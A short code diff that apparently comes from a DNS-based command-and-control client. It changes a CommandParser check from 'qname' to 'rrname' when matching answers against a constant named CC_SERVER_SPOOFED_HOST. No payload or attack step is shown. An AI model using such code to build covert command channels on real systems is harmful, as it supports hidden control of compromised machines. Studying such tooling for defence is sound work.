@@ -22,7 +22,7 @@ class CommandParser:
             print("no txt")
             return None
 
-        if an.qname != CC_SERVER_SPOOFED_HOST:
+        if an.rrname != CC_SERVER_SPOOFED_HOST:
             print("wrong host")
             return None
 
